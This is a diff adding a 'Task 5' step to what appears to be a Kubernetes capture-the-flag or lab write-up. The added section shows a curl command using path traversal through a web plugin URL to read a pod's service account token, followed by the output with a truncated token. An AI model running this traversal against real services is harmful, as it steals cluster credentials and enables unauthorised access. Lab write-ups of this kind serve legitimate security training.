@@ -45,3 +45,13 @@ Install kubectl following the instructions.
 
 1.
 
+## Task 5
+
+```bash
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ curl --path-as-is http://10.105.120.1:3000/public/plugins/alertGroups/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+</var/run/secrets/kubernetes.io/serviceaccount/token
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1022  100  1022    0     0   499k      0 --:--:-- --:--:-- --:--:--  499k
+eyJhbGciOiJSUzI1NiIsImtpZCI6IkpwcUhIZ1hyRF9FbGYyQ1piWHNiemZhNGpnSTl0Z3Z1X2dMeFAtTURUaVUifQ[.....]
+```
